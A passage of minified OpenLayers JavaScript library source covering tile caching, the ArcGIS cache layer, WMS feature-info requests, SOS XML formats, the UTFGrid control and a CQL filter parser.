OpenLayers.Layer.Grid){a.events.on({addtile:this.addTile,retile:this.clearTileQueue,scope:this});var b,c,d;for(b=a.grid.length-\n1;0<=b;--b)for(c=a.grid[b].length-1;0<=c;--c)d=a.grid[b][c],this.addTile({tile:d}),d.url&&!d.imgDiv&&this.manageTileCache({object:d})}},removeLayer:function(a){a=a.layer;if(a instanceof OpenLayers.Layer.Grid&&(this.clearTileQueue({object:a}),a.events&&a.events.un({addtile:this.addTile,retile:this.clearTileQueue,scope:this}),a.grid)){var b,c,d;for(b=a.grid.length-1;0<=b;--b)for(c=a.grid[b].length-1;0<=c;--c)d=a.grid[b][c],this.unloadTile({object:d})}},updateTimeout:function(a,b,c){window.clearTimeout(this.tileQueueId[a.id]);\nvar d=this.tileQueue[a.id];if(!c||d.length)this.tileQueueId[a.id]=window.setTimeout(OpenLayers.Function.bind(function(){this.drawTilesFromQueue(a);d.length&&this.updateTimeout(a,this.frameDelay)},this),b)},addTile:function(a){if(a.tile instanceof OpenLayers.Tile.Image)a.tile.events.on({beforedraw:this.queueTileDraw,beforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this});else this.removeLayer({layer:a.tile.layer})},unloadTile:function(a){a=a.object;a.events.un({beforedraw:this.queueTileDraw,\nbeforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this});OpenLayers.Util.removeItem(this.tileQueue[a.layer.map.id],a)},queueTileDraw:function(a){a=a.object;var b=!1,c=a.layer,d=c.getURL(a.bounds),e=this.tileCache[d];e&&\"olTileImage\"!==e.className&&(delete this.tileCache[d],OpenLayers.Util.removeItem(this.tileCacheIndex,d),e=null);!c.url||!c.async&&e||(b=this.tileQueue[c.map.id],~OpenLayers.Util.indexOf(b,a)||b.push(a),b=!0);return!b},drawTilesFromQueue:function(a){var b=\nthis.tileQueue[a.id],c=this.tilesPerFrame;for(a=a.zoomTween&&a.zoomTween.playing;!a&&b.length&&c;)b.shift().draw(!0),--c},manageTileCache:function(a){a=a.object;var b=this.tileCache[a.url];b&&(b.parentNode&&OpenLayers.Element.hasClass(b.parentNode,\"olBackBuffer\")&&(b.parentNode.removeChild(b),b.id=null),b.parentNode||(b.style.visibility=\"hidden\",b.style.opacity=0,a.setImage(b),OpenLayers.Util.removeItem(this.tileCacheIndex,a.url),this.tileCacheIndex.push(a.url)))},addToCache:function(a){a=a.object;\nthis.tileCache[a.url]||OpenLayers.Element.hasClass(a.imgDiv,\"olImageLoadError\")||(this.tileCacheIndex.length>=this.cacheSize&&(delete this.tileCache[this.tileCacheIndex[0]],this.tileCacheIndex.shift()),this.tileCache[a.url]=a.imgDiv,this.tileCacheIndex.push(a.url))},clearTileQueue:function(a){a=a.object;for(var b=this.tileQueue[a.map.id],c=b.length-1;0<=c;--c)b[c].layer===a&&b.splice(c,1)},destroy:function(){for(var a=this.maps.length-1;0<=a;--a)this.removeMap(this.maps[a]);this.tileCacheIndex=this.tileCache=\nthis.tileQueueId=this.tileQueue=this.maps=null;this._destroyed=!0}});OpenLayers.Layer.ArcGISCache=OpenLayers.Class(OpenLayers.Layer.XYZ,{url:null,tileOrigin:null,tileSize:new OpenLayers.Size(256,256),useArcGISServer:!0,type:\"png\",useScales:!1,overrideDPI:!1,initialize:function(a,b,c){OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.resolutions&&(this.serverResolutions=this.resolutions,this.maxExtent=this.getMaxExtentForResolution(this.resolutions[0]));if(this.layerInfo){var d=this.layerInfo,e=new OpenLayers.Bounds(d.fullExtent.xmin,d.fullExtent.ymin,\nd.fullExtent.xmax,d.fullExtent.ymax);this.projection=\"EPSG:\"+d.spatialReference.wkid;this.sphericalMercator=102100==d.spatialReference.wkid;this.units=\"esriFeet\"==d.units?\"ft\":\"m\";if(d.tileInfo){this.tileSize=new OpenLayers.Size(d.tileInfo.width||d.tileInfo.cols,d.tileInfo.height||d.tileInfo.rows);this.tileOrigin=new OpenLayers.LonLat(d.tileInfo.origin.x,d.tileInfo.origin.y);var f=new OpenLayers.Geometry.Point(e.left,e.top),e=new OpenLayers.Geometry.Point(e.right,e.bottom);this.useScales?this.scales=\n[]:this.resolutions=[];this.lods=[];for(var g in d.tileInfo.lods)if(d.tileInfo.lods.hasOwnProperty(g)){var h=d.tileInfo.lods[g];this.useScales?this.scales.push(h.scale):this.resolutions.push(h.resolution);var k=this.getContainingTileCoords(f,h.resolution);h.startTileCol=k.x;h.startTileRow=k.y;k=this.getContainingTileCoords(e,h.resolution);h.endTileCol=k.x;h.endTileRow=k.y;this.lods.push(h)}this.maxExtent=this.calculateMaxExtentWithLOD(this.lods[0]);this.serverResolutions=this.resolutions;this.overrideDPI&&\nd.tileInfo.dpi&&(OpenLayers.DOTS_PER_INCH=d.tileInfo.dpi)}}},getContainingTileCoords:function(a,b){return new OpenLayers.Pixel(Math.max(Math.floor((a.x-this.tileOrigin.lon)/(this.tileSize.w*b)),0),Math.max(Math.floor((this.tileOrigin.lat-a.y)/(this.tileSize.h*b)),0))},calculateMaxExtentWithLOD:function(a){var b=this.tileOrigin.lon+a.startTileCol*this.tileSize.w*a.resolution,c=this.tileOrigin.lat-a.startTileRow*this.tileSize.h*a.resolution;return new OpenLayers.Bounds(b,c-(a.endTileRow-a.startTileRow+\n1)*this.tileSize.h*a.resolution,b+(a.endTileCol-a.startTileCol+1)*this.tileSize.w*a.resolution,c)},calculateMaxExtentWithExtent:function(a,b){var c=new OpenLayers.Geometry.Point(a.left,a.top),d=new OpenLayers.Geometry.Point(a.right,a.bottom),c=this.getContainingTileCoords(c,b),d=this.getContainingTileCoords(d,b);return this.calculateMaxExtentWithLOD({resolution:b,startTileCol:c.x,startTileRow:c.y,endTileCol:d.x,endTileRow:d.y})},getUpperLeftTileCoord:function(a){var b=new OpenLayers.Geometry.Point(this.maxExtent.left,\nthis.maxExtent.top);return this.getContainingTileCoords(b,a)},getLowerRightTileCoord:function(a){var b=new OpenLayers.Geometry.Point(this.maxExtent.right,this.maxExtent.bottom);return this.getContainingTileCoords(b,a)},getMaxExtentForResolution:function(a){var b=this.getUpperLeftTileCoord(a),c=this.getLowerRightTileCoord(a),d=this.tileOrigin.lon+b.x*this.tileSize.w*a,e=this.tileOrigin.lat-b.y*this.tileSize.h*a;return new OpenLayers.Bounds(d,e-(c.y-b.y+1)*this.tileSize.h*a,d+(c.x-b.x+1)*this.tileSize.w*\na,e)},clone:function(a){null==a&&(a=new OpenLayers.Layer.ArcGISCache(this.name,this.url,this.options));return OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])},initGriddedTiles:function(a){delete this._tileOrigin;OpenLayers.Layer.XYZ.prototype.initGriddedTiles.apply(this,arguments)},getMaxExtent:function(){var a=this.map.getResolution();return this.maxExtent=this.getMaxExtentForResolution(a)},getTileOrigin:function(){if(!this._tileOrigin){var a=this.getMaxExtent();this._tileOrigin=new OpenLayers.LonLat(a.left,\na.bottom)}return this._tileOrigin},getURL:function(a){var b=this.getResolution(),c=this.tileOrigin.lon+b*this.tileSize.w/2,d=this.tileOrigin.lat-b*this.tileSize.h/2;a=a.getCenterLonLat();c=Math.round(Math.abs((a.lon-c)/(b*this.tileSize.w)));d=Math.round(Math.abs((d-a.lat)/(b*this.tileSize.h)));a=this.map.getZoom();if(this.lods){if(b=this.lods[this.map.getZoom()],c<b.startTileCol||c>b.endTileCol||d<b.startTileRow||d>b.endTileRow)return null}else{var e=this.getUpperLeftTileCoord(b),b=this.getLowerRightTileCoord(b);\nif(c<e.x||c>=b.x||d<e.y||d>=b.y)return null}b=this.url;e=\"\"+c+d+a;OpenLayers.Util.isArray(b)&&(b=this.selectUrl(e,b));this.useArcGISServer?b+=\"/tile/${z}/${y}/${x}\":(c=\"C\"+OpenLayers.Number.zeroPad(c,8,16),d=\"R\"+OpenLayers.Number.zeroPad(d,8,16),a=\"L\"+OpenLayers.Number.zeroPad(a,2,10),b=b+\"/${z}/${y}/${x}.\"+this.type);b=OpenLayers.String.format(b,{x:c,y:d,z:a});return OpenLayers.Util.urlAppend(b,OpenLayers.Util.getParameterString(this.params))},CLASS_NAME:\"OpenLayers.Layer.ArcGISCache\"});OpenLayers.Control.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,{hover:!1,drillDown:!1,maxFeatures:10,clickCallback:\"click\",output:\"features\",layers:null,queryVisible:!1,url:null,layerUrls:null,infoFormat:\"text/html\",vendorParams:{},format:null,formatOptions:null,handler:null,hoverRequest:null,initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions));\n!0===this.drillDown&&(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.getInfoForHover},OpenLayers.Util.extend(this.handlerOptions.hover||{},{delay:250})):(a={},a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||{}))},getInfoForClick:function(a){this.events.triggerEvent(\"beforegetfeatureinfo\",{xy:a.xy});OpenLayers.Element.addClass(this.map.viewPortDiv,\"olCursorWait\");this.request(a.xy,\n{})},getInfoForHover:function(a){this.events.triggerEvent(\"beforegetfeatureinfo\",{xy:a.xy});this.request(a.xy,{hover:!0})},cancelHover:function(){this.hoverRequest&&(this.hoverRequest.abort(),this.hoverRequest=null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d,e=a.length-1;0<=e;--e)c=a[e],c instanceof OpenLayers.Layer.WMS&&(!this.queryVisible||c.getVisibility())&&(d=OpenLayers.Util.isArray(c.url)?c.url[0]:c.url,!1!==this.drillDown||this.url||(this.url=d),(!0===this.drillDown||\nthis.urlMatches(d))&&b.push(c));return b},urlMatches:function(a){var b=OpenLayers.Util.isEquivalentUrl(this.url,a);if(!b&&this.layerUrls)for(var c=0,d=this.layerUrls.length;c<d;++c)if(OpenLayers.Util.isEquivalentUrl(this.layerUrls[c],a)){b=!0;break}return b},buildWMSOptions:function(a,b,c,d){for(var e=[],f=[],g=0,h=b.length;g<h;g++)null!=b[g].params.LAYERS&&(e=e.concat(b[g].params.LAYERS),f=f.concat(this.getStyleNames(b[g])));b=b[0];g=this.map.getProjection();(h=b.projection)&&h.equals(this.map.getProjectionObject())&&\n(g=h.getCode());d=OpenLayers.Util.extend({service:\"WMS\",version:b.params.VERSION,request:\"GetFeatureInfo\",exceptions:b.params.EXCEPTIONS,bbox:this.map.getExtent().toBBOX(null,b.reverseAxisOrder()),feature_count:this.maxFeatures,height:this.map.getSize().h,width:this.map.getSize().w,format:d,info_format:b.params.INFO_FORMAT||this.infoFormat},1.3<=parseFloat(b.params.VERSION)?{crs:g,i:parseInt(c.x),j:parseInt(c.y)}:{srs:g,x:parseInt(c.x),y:parseInt(c.y)});0!=e.length&&(d=OpenLayers.Util.extend({layers:e,\nquery_layers:e,styles:f},d));OpenLayers.Util.applyDefaults(d,this.vendorParams);return{url:a,params:OpenLayers.Util.upperCaseObject(d),callback:function(b){this.handleResponse(c,b,a)},scope:this}},getStyleNames:function(a){return a.params.STYLES?a.params.STYLES:OpenLayers.Util.isArray(a.params.LAYERS)?Array(a.params.LAYERS.length):a.params.LAYERS.replace(/[^,]/g,\"\")},request:function(a,b){var c=this.findLayers();if(0==c.length)this.events.triggerEvent(\"nogetfeatureinfo\"),OpenLayers.Element.removeClass(this.map.viewPortDiv,\n\"olCursorWait\");else if(b=b||{},!1===this.drillDown){var c=this.buildWMSOptions(this.url,c,a,c[0].params.FORMAT),d=OpenLayers.Request.GET(c);!0===b.hover&&(this.hoverRequest=d)}else{this._numRequests=this._requestCount=0;this.features=[];for(var d={},e,f=0,g=c.length;f<g;f++){var h=c[f];e=OpenLayers.Util.isArray(h.url)?h.url[0]:h.url;e in d?d[e].push(h):(this._numRequests++,d[e]=[h])}for(e in d)c=d[e],c=this.buildWMSOptions(e,c,a,c[0].params.FORMAT),OpenLayers.Request.GET(c)}},triggerGetFeatureInfo:function(a,\nb,c){this.events.triggerEvent(\"getfeatureinfo\",{text:a.responseText,features:c,request:a,xy:b});OpenLayers.Element.removeClass(this.map.viewPortDiv,\"olCursorWait\")},handleResponse:function(a,b,c){var d=b.responseXML;d&&d.documentElement||(d=b.responseText);d=this.format.read(d);!1===this.drillDown?this.triggerGetFeatureInfo(b,a,d):(this._requestCount++,this._features=\"object\"===this.output?(this._features||[]).concat({url:c,features:d}):(this._features||[]).concat(d),this._requestCount===this._numRequests&&\n(this.triggerGetFeatureInfo(b,a,this._features.concat()),delete this._features,delete this._requestCount,delete this._numRequests))},CLASS_NAME:\"OpenLayers.Control.WMSGetFeatureInfo\"});OpenLayers.Format.WMSCapabilities.v1_3_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_3,{version:\"1.3.0\",CLASS_NAME:\"OpenLayers.Format.WMSCapabilities.v1_3_0\"});OpenLayers.Format.SOSGetFeatureOfInterest=OpenLayers.Class(OpenLayers.Format.XML,{VERSION:\"1.0.0\",namespaces:{sos:\"http://www.opengis.net/sos/1.0\",gml:\"http://www.opengis.net/gml\",sa:\"http://www.opengis.net/sampling/1.0\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},schemaLocation:\"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosAll.xsd\",defaultPrefix:\"sos\",regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},read:function(a){\"string\"==\ntypeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={features:[]};this.readNode(a,b);a=[];for(var c=0,d=b.features.length;c<d;c++){var e=b.features[c];this.internalProjection&&(this.externalProjection&&e.components[0])&&e.components[0].transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(e.components[0],e.attributes);a.push(e)}return a},readers:{sa:{SamplingPoint:function(a,b){if(!b.attributes){var c=\n{attributes:{}};b.features.push(c);b=c}b.attributes.id=this.getAttributeNS(a,this.namespaces.gml,\"id\");this.readChildNodes(a,b)},position:function(a,b){this.readChildNodes(a,b)}},gml:OpenLayers.Util.applyDefaults({FeatureCollection:function(a,b){this.readChildNodes(a,b)},featureMember:function(a,b){var c={attributes:{}};b.features.push(c);this.readChildNodes(a,c)},name:function(a,b){b.attributes.name=this.getChildValue(a)},pos:function(a,b){this.externalProjection||(this.externalProjection=new OpenLayers.Projection(a.getAttribute(\"srsName\")));\nOpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[a,b])}},OpenLayers.Format.GML.v3.prototype.readers.gml)},writers:{sos:{GetFeatureOfInterest:function(a){for(var b=this.createElementNSPlus(\"GetFeatureOfInterest\",{attributes:{version:this.VERSION,service:\"SOS\",\"xsi:schemaLocation\":this.schemaLocation}}),c=0,d=a.fois.length;c<d;c++)this.writeNode(\"FeatureOfInterestId\",{foi:a.fois[c]},b);return b},FeatureOfInterestId:function(a){return this.createElementNSPlus(\"FeatureOfInterestId\",{value:a.foi})}}},\nCLASS_NAME:\"OpenLayers.Format.SOSGetFeatureOfInterest\"});OpenLayers.Format.SOSGetObservation=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:\"http://www.opengis.net/ows\",gml:\"http://www.opengis.net/gml\",sos:\"http://www.opengis.net/sos/1.0\",ogc:\"http://www.opengis.net/ogc\",om:\"http://www.opengis.net/om/1.0\",sa:\"http://www.opengis.net/sampling/1.0\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},VERSION:\"1.0.0\",schemaLocation:\"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosGetObservation.xsd\",\ndefaultPrefix:\"sos\",read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={measurements:[],observations:[]};this.readNode(a,b);return b},write:function(a){a=this.writeNode(\"sos:GetObservation\",a);a.setAttribute(\"xmlns:om\",this.namespaces.om);a.setAttribute(\"xmlns:ogc\",this.namespaces.ogc);this.setAttributeNS(a,this.namespaces.xsi,\"xsi:schemaLocation\",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,\n[a])},readers:{om:{ObservationCollection:function(a,b){b.id=this.getAttributeNS(a,this.namespaces.gml,\"id\");this.readChildNodes(a,b)},member:function(a,b){this.readChildNodes(a,b)},Measurement:function(a,b){var c={};b.measurements.push(c);this.readChildNodes(a,c)},Observation:function(a,b){var c={};b.observations.push(c);this.readChildNodes(a,c)},samplingTime:function(a,b){var c={};b.samplingTime=c;this.readChildNodes(a,c)},observedProperty:function(a,b){b.observedProperty=this.getAttributeNS(a,this.namespaces.xlink,\n\"href\");this.readChildNodes(a,b)},procedure:function(a,b){b.procedure=this.getAttributeNS(a,this.namespaces.xlink,\"href\");this.readChildNodes(a,b)},featureOfInterest:function(a,b){var c={features:[]};b.fois=[];b.fois.push(c);this.readChildNodes(a,c);for(var d=[],e=0,f=c.features.length;e<f;e++){var g=c.features[e];d.push(new OpenLayers.Feature.Vector(g.components[0],g.attributes))}c.features=d},result:function(a,b){var c={};b.result=c;\"\"!==this.getChildValue(a)?(c.value=this.getChildValue(a),c.uom=\na.getAttribute(\"uom\")):this.readChildNodes(a,c)}},sa:OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.sa,gml:OpenLayers.Util.applyDefaults({TimeInstant:function(a,b){var c={};b.timeInstant=c;this.readChildNodes(a,c)},timePosition:function(a,b){b.timePosition=this.getChildValue(a)}},OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.gml)},writers:{sos:{GetObservation:function(a){var b=this.createElementNSPlus(\"GetObservation\",{attributes:{version:this.VERSION,service:\"SOS\"}});this.writeNode(\"offering\",\na,b);a.eventTime&&this.writeNode(\"eventTime\",a,b);for(var c in a.procedures)this.writeNode(\"procedure\",a.procedures[c],b);for(var d in a.observedProperties)this.writeNode(\"observedProperty\",a.observedProperties[d],b);a.foi&&this.writeNode(\"featureOfInterest\",a.foi,b);this.writeNode(\"responseFormat\",a,b);a.resultModel&&this.writeNode(\"resultModel\",a,b);a.responseMode&&this.writeNode(\"responseMode\",a,b);return b},featureOfInterest:function(a){var b=this.createElementNSPlus(\"featureOfInterest\");this.writeNode(\"ObjectID\",\na.objectId,b);return b},ObjectID:function(a){return this.createElementNSPlus(\"ObjectID\",{value:a})},responseFormat:function(a){return this.createElementNSPlus(\"responseFormat\",{value:a.responseFormat})},procedure:function(a){return this.createElementNSPlus(\"procedure\",{value:a})},offering:function(a){return this.createElementNSPlus(\"offering\",{value:a.offering})},observedProperty:function(a){return this.createElementNSPlus(\"observedProperty\",{value:a})},eventTime:function(a){var b=this.createElementNSPlus(\"eventTime\");\n\"latest\"===a.eventTime&&this.writeNode(\"ogc:TM_Equals\",a,b);return b},resultModel:function(a){return this.createElementNSPlus(\"resultModel\",{value:a.resultModel})},responseMode:function(a){return this.createElementNSPlus(\"responseMode\",{value:a.responseMode})}},ogc:{TM_Equals:function(a){var b=this.createElementNSPlus(\"ogc:TM_Equals\");this.writeNode(\"ogc:PropertyName\",{property:\"urn:ogc:data:time:iso8601\"},b);\"latest\"===a.eventTime&&this.writeNode(\"gml:TimeInstant\",{value:\"latest\"},b);return b},PropertyName:function(a){return this.createElementNSPlus(\"ogc:PropertyName\",\n{value:a.property})}},gml:{TimeInstant:function(a){var b=this.createElementNSPlus(\"gml:TimeInstant\");this.writeNode(\"gml:timePosition\",a,b);return b},timePosition:function(a){return this.createElementNSPlus(\"gml:timePosition\",{value:a.value})}}},CLASS_NAME:\"OpenLayers.Format.SOSGetObservation\"});OpenLayers.Control.UTFGrid=OpenLayers.Class(OpenLayers.Control,{autoActivate:!0,layers:null,defaultHandlerOptions:{delay:300,pixelTolerance:4,stopMove:!1,single:!0,\"double\":!1,stopSingle:!1,stopDouble:!1},handlerMode:\"click\",setHandler:function(a){this.handlerMode=a;this.resetHandler()},resetHandler:function(){this.handler&&(this.handler.deactivate(),this.handler.destroy(),this.handler=null);\"hover\"==this.handlerMode?this.handler=new OpenLayers.Handler.Hover(this,{pause:this.handleEvent,move:this.reset},\nthis.handlerOptions):\"click\"==this.handlerMode?this.handler=new OpenLayers.Handler.Click(this,{click:this.handleEvent},this.handlerOptions):\"move\"==this.handlerMode&&(this.handler=new OpenLayers.Handler.Hover(this,{pause:this.handleEvent,move:this.handleEvent},this.handlerOptions));return this.handler?!0:!1},initialize:function(a){a=a||{};a.handlerOptions=a.handlerOptions||this.defaultHandlerOptions;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.resetHandler()},handleEvent:function(a){if(null==\na)this.reset();else{var b=this.map.getLonLatFromPixel(a.xy);if(b){var c=this.findLayers();if(0<c.length){for(var d={},e,f,g=0,h=c.length;g<h;g++)e=c[g],f=OpenLayers.Util.indexOf(this.map.layers,e),d[f]=e.getFeatureInfo(b);this.callback(d,b,a.xy)}}}},callback:function(a){},reset:function(a){this.callback(null)},findLayers:function(){for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0<=d;--d)c=a[d],c instanceof OpenLayers.Layer.UTFGrid&&b.push(c);return b},CLASS_NAME:\"OpenLayers.Control.UTFGrid\"});OpenLayers.Format.CQL=function(){function a(a){function b(){var a=e.pop();switch(a.type){case \"LOGICAL\":var c=b(),g=b();return new OpenLayers.Filter.Logical({filters:[g,c],type:f[a.text.toUpperCase()]});case \"NOT\":return a=b(),new OpenLayers.Filter.Logical({filters:[a],type:OpenLayers.Filter.Logical.NOT});case \"BETWEEN\":return e.pop(),g=b(),a=b(),c=b(),new OpenLayers.Filter.Comparison({property:c,lowerBoundary:a,upperBoundary:g,type:OpenLayers.Filter.Comparison.BETWEEN});case \"COMPARISON\":return g=\nb(),c=b(),new OpenLayers.Filter.Comparison({property:c,value:g,type:d[a.text.toUpperCase()]});case \"IS_NULL\":return c=b(),new OpenLayers.Filter.Comparison({property:c,type:d[a.text.toUpperCase()]});case \"VALUE\":return(c=a.text.match(/^'(.*)'$/))?c[1].replace(/''/g,\"'\"):Number(a.text);case \"SPATIAL\":switch(a.text.toUpperCase()){case \"BBOX\":var a=b(),c=b(),g=b(),h=b(),k=b();return new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,property:k,value:OpenLayers.Bounds.fromArray([h,g,c,\na])});case \"INTERSECTS\":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:c,value:g});case \"WITHIN\":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.WITHIN,property:c,value:g});case \"CONTAINS\":return g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.CONTAINS,property:c,value:g});case \"DWITHIN\":return a=b(),g=b(),c=b(),new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN,value:g,\nproperty:c,distance:Number(a)})}case \"GEOMETRY\":return OpenLayers.Geometry.fromWKT(a.text);default:return a.text}}for(var c=[],e=[];a.length;){var g=a.shift();switch(g.type){case \"PROPERTY\":case \"GEOMETRY\":case \"VALUE\":e.push(g);break;case \"COMPARISON\":case \"BETWEEN\":case \"IS_NULL\":case \"LOGICAL\":for(var k=h[g.type];0<c.length&&h[c[c.length-1].type]<=k;)e.push(c.pop());c.push(g);break;case \"SPATIAL\":case \"NOT\":case \"LPAREN\":c.push(g);break;case \"RPAREN\":for(;0<c.length&&\"LPAREN\"!=c[c.length-1].type;)e.push(c.pop());\nc.pop();0<c.length&&\"SPATIAL\"==c[c.length-1].type&&e.push(c.pop());case \"COMMA\":case \"END\":break;default:throw Error(\"Unknown token type \"+g.type);}}for(;0<c.length;)e.push(c.pop());a=b();if(0<e.length){a=\"Remaining tokens after building AST: \\n\";for(c=e.length-1;0<=c;c--)a+=e[c].type+\": \"+e[c].text+\"\\n\";throw Error(a);}return a}var b={PROPERTY:/^[_a-zA-Z]\\w*/,COMPARISON:/^(=|<>|<=|<|>=|>|LIKE)/i,IS_NULL:/^IS NULL/i,COMMA:/^,/,LOGICAL:/^(AND|OR)/i,VALUE:/^('([^']|'')*'|\\d+(\\.\\d*)?|\\.\\d+)/,LPAREN:/^\\(/,\nRPAREN:/^\\)/,SPATIAL:/^(BBOX|INTERSECTS|DWITHIN|WITHIN|CONTAINS)/i,NOT:/^NOT/i,BETWEEN:/^BETWEEN/i,GEOMETRY:function(a){var b=/^(POINT|LINESTRING|POLYGON|MULTIPOINT|MULTILINESTRING|MULTIPOLYGON|GEOMETRYCOLLECTION)/.exec(a);if(b){var c=a.length,b=a.indexOf(\"(\",b[0].length);if(-1<b)for(var d=1;b<c&&0<d;)switch(b++,a.charAt(b)){case \"(\":d++;break;case \")\":d--}return[a.substr(0,b+1)]}},END:/^$/},c={LPAREN:[\"GEOMETRY\",\"SPATIAL\",\"PROPERTY\",\"VALUE\",\"LPAREN\"],RPAREN:[\"NOT\",\"LOGICAL\",\"END\",\"RPAREN\"],PROPERTY:[\"COMPARISON\",\n\"BETWEEN\",\"COMMA\",\"IS_NULL\"],BETWEEN:[\"VALUE\"],IS_NULL:[\"END\"],COMPARISON:[\"VALUE\"],COMMA:[\"GEOMETRY\",\"VALUE\",\"PROPERTY\"],VALUE:[\"LOGICAL\",\"COMMA\",\"RPAREN\",\"END\"],SPATIAL:[\"LPAREN\"],LOGICAL:[\"NOT\",\"VALUE\",\"SPATIAL\",\"PROPERTY\",\"LPAREN\"],NOT:[\"PROPERTY\",\"LPAREN\"],GEOMETRY:[\"COMMA\",\"RPAREN\"]},d={\"=\":OpenLayers.Filter.Comparison.EQUAL_TO,\"<>\":OpenLayers.Filter.Comparison.NOT_EQUAL_TO,\"<\":OpenLayers.Filter.Comparison.LESS_THAN,\"<=\":OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO,\">\":OpenLayers.Filter.Comparison.GREATER_THAN,\n\">=\":OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO,LIKE:OpenLayers.Filter.Comparison.LIKE,BETWEEN:OpenLayers.Filter.Comparison.BETWEEN,\"IS NULL\":OpenLayers.Filter.Comparison.IS_NULL},e={},f={AND:OpenLayers.Filter.Logical.AND,OR:OpenLayers.Filter.Logical.OR},g={},h={RPAREN:3,LOGICAL:2,COMPARISON:1},k;for(k in d)d.hasOwnProperty(k)&&(e[d[k]]=k);for(k in f)f.hasOwnProperty(k)&&(g[f[k]]=k);return OpenLayers.Class(OpenLayers.Format,{read:function(d){var e=d;d=[];var f,g=[\"NOT\",\"GEOMETRY\",\"SPATIAL\",\n\"PROPERTY\",\"LPAREN\"];do{a:{f=g;for(var h=void 0,g=void 0,k=f.length,h=0;h<k;h++){var g=f[h],s=b[g]instanceof RegExp?b[g].exec(e):(0,b[g])(e);if(s){f=s[0];e=e.substr(f.length).replace(/^\\s*/,\"\");f={type:g,text:f,remainder:e};break a}}d=\"ERROR: In parsing: [\"+e+\"], expected one of: \";for(h=0;h<k;h++)g=f[h],d+=\"\\n    \"+g+\": \"+b[g];throw Error(d);}e=f.remainder;g=c[f.type];if(\"END\"!=f.type&&!g)throw Error(\"No follows list for \"+f.type);d.push(f)}while(\"END\"!=f.type);d=a(d);this.keepData&&(this.data=d);\nreturn d},write:function(a){if(a instanceof OpenLayers.Geometry)return a.toString();switch(a.CLASS_NAME){case \"OpenLayers.Filter.Spatial\":switch(a.type){case OpenLayers.Filter.Spatial.BBOX:return\"BBOX(\"+a.property+\",\"+a.value.toBBOX()+\")\";case OpenLayers.Filter.Spatial.DWITHIN:return\"DWITHIN(\"+a.property+\", \"+this.write(a.value)+\", \"+a.distance+\")\";case OpenLayers.Filter.Spatial.WITHIN:return\"WITHIN(\"+a.property+\", \"+this.write(a.value)+\")\";case OpenLayers.Filter.Spatial.INTERSECTS:return\"INTERSECTS(\"+\na.property+\", \"+this.write(a.value)+\")\";case OpenLayers.Filter.Spatial.CONTAINS:return\"CONTAINS(\"+a.property+\", \"+this.write(a.value)+\")\";default:throw Error(\"Unknown spatial filter type: \"+a.type);}case \"OpenLayers.Filter.Logical\":if(a.type==OpenLayers.Filter.Logical.NOT)return\"NOT (\"+this.write(a.filters[0])+\")\";for(var b=\"(\",c=!0,d=0;d<a.filters.length;d++)c?c=!1:b+=\") \"+g[a.type]+\" (\",b+=this.write(a.filters[d]);return b+\")\";case \"OpenLayers.Filter.Comparison\":return a.type==OpenLayers.Filter.Comparison.BETWEEN?\na.property+\" BETWEEN \"+this.write(a.lowerBoundary)+\" AND \"+this.write(a.upperBoundary):null!==a.value?a.property+\" \"+e[a.type]+\" \"+this.write(a.value):a.property+\" \"+e[a.type];case void 0:if(\"string\"===typeof a)return\"'\"+a.replace(/'/g,\"''\")+\"'\";if(\"number\"===typeof a)return String(a);default:throw Error(\"Can't encode: \"+a.CLASS_NAME+\" \"+a);}},CLASS_NAME:\"OpenLayers.Format.CQL\"})}();OpenLayers.Control.Split=OpenLayers.Class(OpenLayers.Control,{layer:null,source:null,sourceOptions:null,tolerance:null,edge:!0,deferDelete:!1,mutual:!0,targetFilter:null,sourceFilter:null,handler:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||{};this.options.source&&this.setSource(this.options.source)},setSource:function(a){this.active?(this.deactivate(),this.handler&&(this.handler.destroy(),delete this.handler),this.source=a,this.activate()):this.source=\na},activate:function(){var 